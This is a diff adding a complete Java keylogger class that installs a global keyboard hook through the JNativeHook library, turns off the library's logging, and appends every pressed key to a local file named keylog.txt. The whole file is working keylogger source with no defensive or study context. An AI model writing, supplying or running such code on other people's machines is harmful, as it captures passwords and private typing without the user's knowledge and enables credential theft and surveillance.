@@ -1,0 +1,47 @@
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+public class KeyLogger implements NativeKeyListener {
+
+    private static final String LOG_FILE = "keylog.txt";
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
+            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + " ");
+        } catch (IOException ex) {
+            System.out.println("Error writing to log file: " + ex.getMessage());
+        }
+    }
+
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        // Optional: can log key release here
+    }
+
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        // Optional: can log typed char here
+    }
+
+    public static void main(String[] args) {
+        // Disable JNativeHook logs
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+
+        try {
+            GlobalScreen.registerNativeHook();
+            GlobalScreen.addNativeKeyListener(new KeyLogger());
+            System.out.println("Keylogger is running. Press Ctrl+C to stop.");
+        } catch (NativeHookException e) {
+            System.out.println("Error: " + e.getMessage());
+        }
+    }
+}
